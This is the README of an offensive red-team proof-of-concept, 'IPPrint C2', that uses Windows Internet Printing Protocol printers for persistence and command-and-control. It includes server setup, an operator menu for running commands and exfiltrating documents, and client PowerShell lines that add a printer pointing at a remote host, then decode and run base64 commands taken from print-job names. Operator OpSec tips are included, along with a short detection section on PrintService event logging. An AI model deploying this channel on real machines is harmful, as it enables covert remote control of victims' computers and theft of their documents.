# IPPrint C2
### TL;DR
A Proof-of-Concept for using Microsoft Windows printers for persistence / command and control via Internet Printing.

### Background story
The idea was to create a basic C2 for engagements using built-in Windows functionalities, which can then be used to execute arbitrary commands or load a preferable C2 solution (https://www.thec2matrix.com/matrix). 

A feature in Microsoft Windows was used which enables to install shared printers through Internet Printing Protocol (https://en.wikipedia.org/wiki/Internet_Printing_Protocol). 
Regular users can add a printer without administrative privileges as long there is no driver installation, so usage of existing drivers was mandatory. A default "Microsoft Print to PDF" driver was used. 

The commands that will be executed are sent from the C2 Internet Printing server to the printer's document queue as base64-encoded document names. With basic PowerShell, clients can then obtain these document names from the queue and execute commands on themselves. Also, clients can print documents to this printer that will be saved to a file on the C2 server which is useful to fetch results from executed commands or to exfiltrate documents. An additional plus was that adding a printer shared on the Internet passed through couple of web proxy solutions commonly used in enterprises. Tested on Windows Server 2019 and Windows 10 / 11.

### Server
Internet Information Services, Windows Print Services, Print Server and Internet Printing are required to set up a C2 server. Anonymous authentication is enabled on Internet Information Services so clients can obtain the document queue without authentication and the owner of print jobs is the IUSR user account. The server also installs the shared printer for itself and uses it to submit jobs to its print queue, otherwise the document owner would not be the IUSR user and clients would not be able to obtain the document name from the queue.

The installation script is provided in this repository and should work. Check if you can access your printer to make sure everything went well:
```
http(s)://<IP or DNS>/printers/
http(s)://<IP or DNS>/printers/<printername>/.printer
```
Once all is set up, run the IPPrintC2.ps1 and enter commands which you would like to execute on the client through the document name. The document name has its length limitations, so if the length of the base64 encoded command in the document name is larger than 255 characters, it gets split to several documents in the print queue. This is handled by the IPPrintC2 script while the concatenation is handled by the client.

```
PS C:\Users\administrator\Desktop> .\IPPrintC2.ps1
IPPrint C2 Server
1. Select default C2 printer.
2. Enter command to execute on the client through document name.
3. Enter the path of the PowerShell script you would like to execute.
4. Exfiltrate remote documents.
5. Read IIS logs.
6. Clear the print queue.
7. Kill all clients.
8. Quit.
What do you want to do?: 2
To print output of multiple commands, use this: [scriptblock]$x={whoami;hostname;ipconfig};$x.invoke()
Enter commands you wish to execute: [scriptblock]$x={whoami /all;hostname};$x.invoke()
```
You can also load PowerShell scripts. Keep the scripts simple as they may take a while to get split and sent to the document queue. Also, the scripts are one-off since the print queue eventually gets cleared and the character limit is 32767.

#### OpSec
* Be sure to use the whitelist approach for network segments you are targeting, otherwise anyone can access your print queue.
* It is recommended to setup SSL for obvious reasons. Easiest way to setup SSL:
    * Setup / generate a DNS record for your VM
    * https://certifytheweb.com/ can be used to automate CSR and installation
    * Make sure to edit site bindings under IIS to enable HTTPS and disable HTTP
        * https://docs.microsoft.com/en-us/iis/manage/configuring-security/how-to-set-up-ssl-on-iis


### Client
To execute commands on the client, addition of a printer and a persistent job to obtain and execute commands is needed. Examples:

```
PS C:\Users\regular> Add-Printer XPS -PortName https://somewhere.on.azure.com/printers/af/.printer -DriverName "Microsoft Print To PDF"

PS C:\Users\regular> Get-Printer XPS |fl


Name                         : XPS
ComputerName                 :
Type                         : Local
ShareName                    :
PortName                     : https://somewhere.on.azure.com/printers/af/.printer
DriverName                   : Microsoft Print To PDF
Location                     :
Comment                      :
SeparatorPageFile            :
PrintProcessor               : winprint
Datatype                     : RAW
Shared                       : False
Published                    : False
DeviceType                   : Print
PermissionSDDL               :
RenderingMode                :
KeepPrintedJobs              : False
Priority                     : 1
DefaultJobPriority           : 0
StartTime                    : 0
UntilTime                    : 0
PrinterStatus                : Normal
JobCount                     : 0
DisableBranchOfficeLogging   :
BranchOfficeOfflineLogSizeMB :
WorkflowPolicy               :

PS C:\Users\regular> ((get-printjob XPS).documentname -join "")
WwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQAkAHgAPQB7AHcAaABvAGEAbQBpACAALwBhAGwAbAA7AGgAbwBzAHQAbgBhAG0AZQB9ADsAJAB4AC4AaQBuAHYAbwBrAGUAKAApAA==

PS C:\Users\regular> powershell -enc ((get-printjob XPS).documentname -join "")

USER INFORMATION
----------------

User Name               SID
======================= ==============================================
desktop-printingfun\regular S-1-5-21-1829223926-2430627930-1039442773-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users          Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

DESKTOP-PRINTINGFUN
```
Several payloads are available in the repository. 


### Detection
As always, the best way is to centrally monitor the logs of the infrastructure on your Security Operations Center / Security Information and Event Management solutions and use command-line logging / PowerShell Transcription.

By default, printer installation is not logged in the Event Viewer, but this can be enabled:
* Event Viewer -> Application and Services Logs -> Microsoft -> Windows -> PrintService, right-click and enable the Operational log
    * https://social.technet.microsoft.com/Forums/windowsserver/en-US/8e7399f6-ffdc-48d6-927b-f0beebd4c7f0/enabling-quotprint-historyquot-through-group-policy?forum=winserverprint

With Print Service Operational log enabled you can monitor installation of printers and additional information with Event ID's 300 and 307.

```
Log Name:      Microsoft-Windows-PrintService/Operational
Source:        Microsoft-Windows-PrintService
Date:          6/28/2022 9:15:42 AM
Event ID:      300
Task Category: Adding a printer
Level:         Information
Keywords:      Classic Spooler Event,Printer
User:          DESKTOP-PRINTINGFUN\regular
Computer:      DESKTOP-PRINTINGFUN
Description:
Printer XPS was created. No user action is required.
Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PrintService" Guid="{747ef6fd-e535-4d16-b510-42c90f6873a1}" />
    <EventID>300</EventID>
    <Version>0</Version>
    <Level>4</Level>
    <Task>4</Task>
    <Opcode>11</Opcode>
    <Keywords>0x4000000000000820</Keywords>
    <TimeCreated SystemTime="2022-06-28T07:15:42.7786608Z" />
    <EventRecordID>6</EventRecordID>
    <Correlation />
    <Execution ProcessID="2512" ThreadID="2824" />
    <Channel>Microsoft-Windows-PrintService/Operational</Channel>
    <Computer>DESKTOP-PRINTINGFUN</Computer>
    <Security UserID="S-1-5-21-1829223926-2430127930-1039111773-1002" />
  </System>
  <UserData>
    <PrinterCreated xmlns="http://manifests.microsoft.com/win/2005/08/windows/printing/spooler/core/events">
      <Param1>XPS</Param1>
    </PrinterCreated>
  </UserData>
</Event>
```
```
Log Name:      Microsoft-Windows-PrintService/Operational
Source:        Microsoft-Windows-PrintService
Date:          6/28/2022 11:15:16 AM
Event ID:      307
Task Category: Printing a document
Level:         Information
Keywords:      Classic Spooler Event,Document Print Job
User:          DESKTOP-PRINTINGFUN\regular
Computer:      DESKTOP-PRINTINGFUN
Description:
Document 4, Print Document owned by regular on \\DESKTOP-PRINTINGFUN was printed on XPS through port https://somewhere.on.azure.com/printers/printers/af/.printer.  Size in bytes: 69009. Pages printed: 1. No user action is required.
Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PrintService" Guid="{747ef6fd-e535-4d16-b510-42c90f6873a1}" />
    <EventID>307</EventID>
    <Version>0</Version>
    <Level>4</Level>
    <Task>26</Task>
    <Opcode>11</Opcode>
    <Keywords>0x4000000000000840</Keywords>
    <TimeCreated SystemTime="2022-06-28T09:15:16.1668381Z" />
    <EventRecordID>97</EventRecordID>
    <Correlation />
    <Execution ProcessID="2512" ThreadID="1848" />
    <Channel>Microsoft-Windows-PrintService/Operational</Channel>
    <Computer>DESKTOP-PRINTINGFUN</Computer>
    <Security UserID="S-1-5-21-1829223926-2430127930-1039111773-1002" />
  </System>
  <UserData>
    <DocumentPrinted xmlns="http://manifests.microsoft.com/win/2005/08/windows/printing/spooler/core/events">
      <Param1>4</Param1>
      <Param2>Print Document</Param2>
      <Param3>regular</Param3>
      <Param4>\\DESKTOP-PRINTINGFUN</Param4>
      <Param5>XPS</Param5>
      <Param6>https://somewhere.on.azure.com/printers/af/.printer</Param6>
      <Param7>69009</Param7>
      <Param8>1</Param8>
    </DocumentPrinted>
  </UserData>
</Event>
```

### Files
* Install/InstallScript.ps1 - PowerShell script that installs the prerequisites. You should setup SSL yourself
* Server/IPPrintC2.ps1 - PowerShell script for IPPrintC2 that you run on the server hosting Print Services
* Payloads/payloads.txt - basic list of payloads to get started

### Notes
* The C2 currently works as one-to-all. You can setup additional printers on the C2 server, modify the IPPrintC2.ps1 script and run multiple instances
* Exfiltration of documents needs improvement as it currently works with ASCII text-based files
* Automatic cleaning of documents printed by client's requires improvements
* The IPPrintC2 is provided as-is

In the process of writing this simple C2 it was discovered that somewhat similar technique was also used by WithSecure and published earlier. Not only that, but the name (PrintC2) also was the same, so it was changed to IPPrintC2. Nevertheless, due to the differences and different initial mindset / purpose we decided to release our work. 

### References
* https://windows-internals.com/printdemon-cve-2020-1048/

### Credits
* Author: @kr3bz

Happy printing!
